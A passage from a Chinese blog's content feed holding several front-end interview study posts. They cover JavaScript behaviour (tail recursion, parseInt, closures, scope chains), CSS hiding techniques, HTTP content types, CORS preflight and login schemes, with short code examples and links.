href="https://router.vuejs.org/zh/guide/advanced/lazy-loading.html#%E6%8A%8A%E7%BB%84%E4%BB%B6%E6%8C%89%E7%BB%84%E5%88%86%E5%9D%97" target="_blank" rel="noopener">使用路由懒加载、异步组件</a></li><li>防抖、节流</li><li>第三方模块按需导入</li><li>长列表滚动到可视区域动态加载</li><li>图片懒加载</li></ul><h2 id="npm-install-原理"><a href="#npm-install-原理" class="headerlink" title="npm install 原理"></a>npm install 原理</h2><p><a href="https://cloud.tencent.com/developer/article/1555982" target="_blank" rel="noopener">npm install 原理分析</a></p><h2 id="Map-weakMap-Set-weakSet"><a href="#Map-weakMap-Set-weakSet" class="headerlink" title="Map,weakMap,Set,weakSet"></a>Map,weakMap,Set,weakSet</h2><p><a href="https://juejin.cn/post/6854573210794082318" target="_blank" rel="noopener">JavaScript中的Map、WeakMap、Set和WeakSet介绍</a></p><h2 id="什么是尾递归"><a href="#什么是尾递归" class="headerlink" title="什么是尾递归"></a>什么是尾递归</h2><p><strong>阶乘函数</strong></p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">fact</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> n <span class="token operator">*</span> <span class="token function">fact</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>尾递归实现</strong></p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">facttail</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> res<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token function">facttail</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">*</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>再举一个例子：计算 1 到 n 的整数的和</strong></p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> sum <span class="token operator">=</span> <span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> n<span class="token punctuation">;</span>  <span class="token keyword">return</span> n <span class="token operator">+</span> <span class="token function">sum</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 当前调用栈保留，还需计算 n + ...</span><span class="token punctuation">}</span><span class="token keyword">const</span> sum <span class="token operator">=</span> <span class="token punctuation">(</span>n<span class="token punctuation">,</span> prevSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> n <span class="token operator">+</span> prevSum<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">sum</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> prevSum<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p><strong>根本思想：避免了入栈出栈造成的时间空间损耗</strong></p><h2 id="link-与-import-的区别"><a href="#link-与-import-的区别" class="headerlink" title="link 与 @import 的区别"></a>link 与 @import 的区别</h2><ul><li><code>link</code>功能较多，可以定义 RSS，定义 Rel 等作用，而<code>@import</code>只能用于加载 css</li><li>当解析到<code>link</code>时，页面会同步加载所引的 css，而<code>@import</code>所引用的 css 会等到页面加载完才被加载</li><li><code>@import</code>需要 IE5 以上才能使用</li><li><code>link</code>可以使用 js 动态引入，<code>@import</code>不行</li></ul><h2 id="数组-map-和-forEach-方法的区别？"><a href="#数组-map-和-forEach-方法的区别？" class="headerlink" title="数组 map() 和 forEach() 方法的区别？"></a>数组 <code>map()</code> 和 <code>forEach()</code> 方法的区别？</h2><p>这两个方法都是进行遍历数组的方法。<code>map()</code> 方法通过调回回调函数映射每一个元素到新元素上，并且返回的是一个新数组。另一方面，<code>forEach()</code> 为每个元素调用回调函数，但是它不返回新数组。<code>forEach()</code> 函数通常用于在迭代中产生副作用，而 <code>map()</code> 函数是一种常见的函数式编程技术</p><ul><li>如果你需要遍历数组，会造成元素变化，而且不需要返回值来生成一个新数组，你可以使用 <code>forEach()</code></li><li>对于保持数据的不变，<code>map()</code> 是正确的选择，原始数组的每一个值都会映射到一个新数组中</li></ul><h2 id="静态网站"><a href="#静态网站" class="headerlink" title="静态网站"></a>静态网站</h2><h3 id="什么是静态网站生成器"><a href="#什么是静态网站生成器" class="headerlink" title="什么是静态网站生成器"></a>什么是静态网站生成器</h3><ul><li>静态网站生成器是使用一系列配置，模板以及数据，生成静态HTML文件及相关资源的工具</li><li>这个功能也叫预渲染</li><li>生成的网站不需要服务器，只需要放到支持静态资源的 Web Server 或 CDN 上即可运行</li></ul><h3 id="常见的静态网站生成器"><a href="#常见的静态网站生成器" class="headerlink" title="常见的静态网站生成器"></a>常见的静态网站生成器</h3><ul><li>Jekyll（Ruby）</li><li>Hexo（Node）</li><li>Hugo（Golang）</li><li>Gatsby（Node/React）</li><li>Gridsome（Node/Vue）</li><li>另外，Next.js，Nuxt.js 也能生成静态网站，但是它们更多被认为是服务端渲染框架</li></ul><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><ul><li>不适合有大量路由页面的应用</li><li>不适合有大量动态内容的应用</li><li>适用于纯内容展示网站：博客，文档，宣传站等</li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面试题（九）</title>
      <link href="2018/03/09/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E4%B9%9D%EF%BC%89/"/>
      <url>2018/03/09/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E4%B9%9D%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>content-type是什么</li><li>什么是预检请求</li><li>逗号运算符</li><li>parseInt有什么用</li><li>setTimeout倒计时为什么会出现误差</li><li>聊聊前端登陆</li><li>请详细介绍一下从输入 URL 到页面加载完成的过程？</li><li>fetch/Body.json()</li><li>Object.prototype.hasOwnProperty()</li></ul><h2 id="content-type是什么"><a href="#content-type是什么" class="headerlink" title="content-type是什么"></a>content-type是什么</h2><ul><li>application/x-www-form-urlencoded<ul><li>HTTP会将请求参数用key1=val1&amp;key2=val2的方式进行组织，并放到请求实体里面</li></ul></li><li>application/json<ul><li>JSON 是一种轻量级的数据格式，以“键-值”对的方式组织的数据。这个使用这个类型，需要参数本身就是json格式的数据，参数会被直接放到请求实体里，不进行任何处理。</li></ul></li><li>可以参考<a href="https://www.jianshu.com/p/de5845b4c095" target="_blank" rel="noopener">Content-Type 详解</a></li></ul><h2 id="什么是预检请求"><a href="#什么是预检请求" class="headerlink" title="什么是预检请求"></a>什么是预检请求</h2><ul><li>预检请求会向服务器确认跨域是否允许，服务返回的响应头里有对应字段<code>Access-Control-Allow-Origin</code>来给浏览器判断：如果允许，浏览器紧接着发送实际请求；不允许，报错并禁止客户端脚本读取响应相关的任何东西。</li><li>参考<a href="https://zhuanlan.zhihu.com/p/46405073" target="_blank" rel="noopener">预检请求 OPTIONS</a></li></ul><h2 id="逗号运算符"><a href="#逗号运算符" class="headerlink" title="逗号运算符"></a>逗号运算符</h2><h2 id="0-function"><a href="#0-function" class="headerlink" title="(0,function)"></a>(0,function)</h2><blockquote><p>逗号运算符，它将先计算左边的参数，再计算右边的参数值。然后返回最右边参数的值。 </p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>  foo<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">===</span> window<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>a<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Returns 'false' in console</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>foo<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Returns 'true' in console</span></code></pre><p>But, if you were call <code>(0, a.foo)()</code>. The expression <code>(0, a.foo)</code> will evaluate each of its operands (from left to right) and returns the value of the last operand. In other words, <code>(0, a.foo)</code> is equivalent to </p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">===</span> window<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><h2 id="parseInt有什么用"><a href="#parseInt有什么用" class="headerlink" title="parseInt有什么用"></a>parseInt有什么用</h2><pre class=" language-js"><code class="language-js"><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//返回 10</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"19"</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//返回 19 (10+9)</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"11"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//返回 3 (2+1)</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"17"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//返回 15 (8+7)</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"1f"</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//返回 31 (16+15)</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">"010"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//未定：返回 10 或 8</span><span class="token comment" spellcheck="true">//BigInt也有转换进制的功能</span><span class="token function">BigInt</span><span class="token punctuation">(</span><span class="token string">"0b"</span><span class="token operator">+</span><span class="token string">"10"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//2</span><span class="token function">BigInt</span><span class="token punctuation">(</span><span class="token string">"0o"</span><span class="token operator">+</span><span class="token string">"10"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//8</span><span class="token function">BigInt</span><span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token operator">+</span><span class="token string">"10"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//16</span><span class="token comment" spellcheck="true">//那么10进制怎么转换成2进制呢</span>NumberObject<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>radix<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//parseInt还具有向下取整的功能</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token number">2.5</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//2</span></code></pre><h2 id="setTimeout倒计时为什么会出现误差"><a href="#setTimeout倒计时为什么会出现误差" class="headerlink" title="setTimeout倒计时为什么会出现误差"></a>setTimeout倒计时为什么会出现误差</h2><blockquote><p>setTimeout() 只是将事件插入了“任务队列”，必须等当前代码（执行栈）执行完，主线程才会去执行它指定的回调函数。要是当前代码消耗时间很长，也有可能要等很久，所以并没办法保证回调函数一定会在 setTimeout() 指定的时间执行。所以， setTimeout() 的第二个参数表示的是最少时间，并非是确切时间。</p><p>HTML5标准规定了 setTimeout() 的第二个参数的最小值不得小于4毫秒，如果低于这个值，则默认是4毫秒。在此之前。老版本的浏览器都将最短时间设为10毫秒。另外，对于那些DOM的变动（尤其是涉及页面重新渲染的部分），通常是间隔16毫秒执行。这时使用 requestAnimationFrame() 的效果要好于 setTimeout();</p></blockquote><h2 id="前端登陆"><a href="#前端登陆" class="headerlink" title="前端登陆"></a>前端登陆</h2><ul><li>Cookie + Session 登录<ul><li>服务端存储 session ，客户端存储 cookie，其中 cookie 保存的为 sessionID</li><li>可以灵活 revoke 权限，更新信息后可以方便的同步 session 中相应内容</li><li>分布式 session 一般使用 redis(或其他KV) 存储</li><li>适合传统系统独立鉴权</li></ul></li><li>Token 登录</li><li>SSO 单点登录</li><li>OAuth 第三方登录</li></ul><p><a href="https://juejin.cn/post/6845166891393089544" target="_blank" rel="noopener">前端登录，这一篇就够了</a></p><h2 id="请详细介绍一下从输入-URL-到页面加载完成的过程？"><a href="#请详细介绍一下从输入-URL-到页面加载完成的过程？" class="headerlink" title="请详细介绍一下从输入 URL 到页面加载完成的过程？"></a>请详细介绍一下从输入 URL 到页面加载完成的过程？</h2><p><a href="https://mp.weixin.qq.com/s/O8j9gM5tD5rjLz1kdda3LA" target="_blank" rel="noopener">一道面试题是如何引发深层次的灵魂拷问</a></p><h2 id="fetch-Body-json"><a href="#fetch-Body-json" class="headerlink" title="fetch/Body.json()"></a>fetch/Body.json()</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch" target="_blank" rel="noopener">使用 Fetch</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Body/json" target="_blank" rel="noopener">Body.json()</a></p><h2 id="Object-prototype-hasOwnProperty"><a href="#Object-prototype-hasOwnProperty" class="headerlink" title="Object.prototype.hasOwnProperty()"></a>Object.prototype.hasOwnProperty()</h2><blockquote><p><code>hasOwnProperty()</code> 方法会返回一个布尔值，指示对象自身属性中是否具有指定的属性（也就是，是否有指定的键）。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> object1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>object1<span class="token punctuation">.</span>property1 <span class="token operator">=</span> <span class="token number">42</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object1<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token string">'property1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// expected output: true</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object1<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token string">'toString'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// expected output: false</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object1<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token string">'hasOwnProperty'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// expected output: false</span></code></pre><blockquote><p>所有继承了 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object" target="_blank" rel="noopener"><code>Object</code></a> 的对象都会继承到 <code>hasOwnProperty</code> 方法。这个方法可以用来检测一个对象是否含有特定的自身属性；和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in" target="_blank" rel="noopener"><code>in</code></a> 运算符不同，该方法会忽略掉那些从原型链上继承到的属性。</p><p>即使属性的值是 <code>null</code> 或 <code>undefined</code>，只要属性存在，<code>hasOwnProperty</code> 依旧会返回 <code>true</code>。</p></blockquote><pre class=" language-js"><code class="language-js">o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>o<span class="token punctuation">.</span>propOne <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>o<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token string">'propOne'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 返回 true</span>o<span class="token punctuation">.</span>propTwo <span class="token operator">=</span> undefined<span class="token punctuation">;</span>o<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span><span class="token string">'propTwo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 返回 true</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面试题（四）</title>
      <link href="2018/03/09/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
      <url>2018/03/09/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>深拷贝与浅拷贝</li><li>什么是BFC，BFC的布局规则是什么，如何创建BFC</li><li>隐藏页面中某个元素的方法</li><li>说一下你对JS执行上下文和作用域链的理解</li><li>防抖函数，节流函数的作用与实现</li><li>什么是闭包，闭包的作用是什么</li><li>实现一个flattenDeep函数，把嵌套的数组扁平化</li><li>关于reduce函数</li><li>数组去重的方法</li><li>时间复杂度和空间复杂度分别对应计算机什么资源</li><li>css画三角形和扇形</li></ul><h2 id="深拷贝与浅拷贝"><a href="#深拷贝与浅拷贝" class="headerlink" title="深拷贝与浅拷贝"></a>深拷贝与浅拷贝</h2><ul><li><a href="https://jinjingxuan.github.io/2018/09/27/JavaScript-%E6%B5%85%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B7%B1%E6%8B%B7%E8%B4%9D/" target="_blank" rel="noopener">深拷贝与浅拷贝</a></li></ul><h2 id="什么是BFC，BFC的布局规则是什么，如何创建BFC"><a href="#什么是BFC，BFC的布局规则是什么，如何创建BFC" class="headerlink" title="什么是BFC，BFC的布局规则是什么，如何创建BFC"></a>什么是BFC，BFC的布局规则是什么，如何创建BFC</h2><ul><li><a href="https://www.jinjingxuan.com/2020/11/26/CSS-%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/" target="_blank" rel="noopener">盒子模型</a></li></ul><h2 id="隐藏页面中某个元素的方法"><a href="#隐藏页面中某个元素的方法" class="headerlink" title="隐藏页面中某个元素的方法"></a>隐藏页面中某个元素的方法</h2><p>隐藏类型：</p><ul><li>完全隐藏：元素从渲染树中消失，不占据空间</li><li>视觉上隐藏：屏幕中不可见，占据空间</li><li>语义上隐藏：读屏软件不可读，但正常占据空间</li></ul><p>完全隐藏：</p><pre class=" language-js"><code class="language-js"><span class="token number">1</span><span class="token punctuation">.</span> display<span class="token punctuation">:</span> none<span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">.</span> <span class="token operator">&lt;</span>div hidden<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  hidden属性</code></pre><p>视觉上隐藏：</p><pre class=" language-js"><code class="language-js"><span class="token number">1</span><span class="token punctuation">.</span>利用poisition和盒模型将元素移出可视区范围position<span class="token punctuation">:</span>absolute<span class="token punctuation">;</span>left<span class="token punctuation">:</span><span class="token operator">-</span>9999px<span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">.</span>利用transform（<span class="token number">1</span>）缩放：transform<span class="token punctuation">:</span> <span class="token function">scale</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">（2）移动：transform：translateX</span><span class="token punctuation">(</span><span class="token operator">-</span>9999px<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> 旋转：transform<span class="token punctuation">:</span> <span class="token function">rotateY</span><span class="token punctuation">(</span>90deg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">3</span><span class="token punctuation">.</span>透明度opacity<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token number">4</span><span class="token punctuation">.</span>visibility<span class="token punctuation">:</span> hidden<span class="token punctuation">;</span><span class="token number">5</span><span class="token punctuation">.</span>层级覆盖， z<span class="token operator">-</span>index 属性z<span class="token operator">-</span>index<span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">999</span><span class="token punctuation">;</span><span class="token number">6</span><span class="token punctuation">.</span>clip<span class="token operator">-</span>path 裁剪clip<span class="token operator">-</span>path<span class="token punctuation">:</span> <span class="token function">polygon</span><span class="token punctuation">(</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">,</span><span class="token number">00</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>语义上隐藏</p><pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>div aria<span class="token operator">-</span>hidden<span class="token operator">=</span><span class="token string">"true"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span></code></pre><h2 id="说一下你对JS执行上下文栈和作用域链的理解"><a href="#说一下你对JS执行上下文栈和作用域链的理解" class="headerlink" title="说一下你对JS执行上下文栈和作用域链的理解"></a>说一下你对JS执行上下文栈和作用域链的理解</h2><p>js执行上下文</p><blockquote><p>执行上下文就是当前 JavaScript 代码被解析和执行时所在环境的抽象概念， JavaScript 中运行任何的代码都是在执行上下文中运行。</p><p>执行上下文类型分为：<br>1.全局执行上下文<br>2.函数执行上下文</p></blockquote><p>作用域</p><blockquote><p>作用域:控制着变量与函数的可见性和生命周期。</p><p>作用域有两种工作模型：词法作用域和动态作用域，JS采用的是词法作用域工作模型，词法作用域意味着作用域是由书写代码时变量和函数声明的位置决定的。</p><p>分为：<br>1.全局作用域<br>2.局部作用域</p><p>局部作用域又分为：<br>1.函数作用域<br>2.块级作用域</p></blockquote><p>js执行上下文栈</p><pre class=" language-js"><code class="language-js">首次运行JavaScript代码的时候<span class="token punctuation">,</span>会创建一个全局执行的上下文并Push到当前的执行栈中，每当发生函数调用，引擎都会为该函数创建一个新的函数执行上下文并Push当前执行栈的栈顶。当栈顶的函数运行完成后，其对应的函数执行上下文将会从执行栈中Pop出，上下文的控制权将移动到当前执行栈的下一个执行上下文。<span class="token keyword">function</span> <span class="token function">fun3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fun3'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">fun2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">fun3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">fun2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>入栈：全局，f1<span class="token punctuation">,</span>f2<span class="token punctuation">,</span>f3出栈：f3<span class="token punctuation">,</span>f2<span class="token punctuation">,</span>f1</code></pre><p>作用域链</p><pre class=" language-js"><code class="language-js">作用域链就是从当前作用域开始一层一层向上寻找某个变量，直到找到全局作用域还是没找到，就宣布放弃。这种一层一层的关系，就是作用域链。 <span class="token keyword">var</span> a<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> b<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>fn2<span class="token punctuation">)</span>    <span class="token keyword">function</span> <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        a<span class="token operator">=</span><span class="token number">20</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> fn2<span class="token punctuation">}</span><span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>fn2中没有a<span class="token punctuation">,</span>向上寻找，fn1中也没有，向上找，在全局作用域中找到了</code></pre><h2 id="防抖函数，节流函数的作用与实现"><a href="#防抖函数，节流函数的作用与实现" class="headerlink" title="防抖函数，节流函数的作用与实现"></a>防抖函数，节流函数的作用与实现</h2><ul><li><a href="https://www.jinjingxuan.com/2020/03/20/%E9%9D%A2%E8%AF%95-%E6%89%8B%E5%86%99%E4%BB%A3%E7%A0%81%E6%95%B4%E7%90%86/" target="_blank" rel="noopener">手写代码整理</a></li></ul><h2 id="什么是闭包，闭包的作用是什么"><a href="#什么是闭包，闭包的作用是什么" class="headerlink" title="什么是闭包，闭包的作用是什么"></a>什么是闭包，闭包的作用是什么</h2><p>闭包是指有权访问另一个函数作用域中的变量的函数 </p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//创建一个闭包</span><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> a<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">let</span> func <span class="token operator">=</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//输出2</span></code></pre><p>闭包的作用：</p><p>（1）访问另一个函数作用域中的变量</p><p>（2）私有化变量</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">privateVariable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> value<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>setValue <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        value<span class="token operator">=</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>getValue <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">privateVariable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>x<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token string">"abcd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//undefined</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>getValue <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 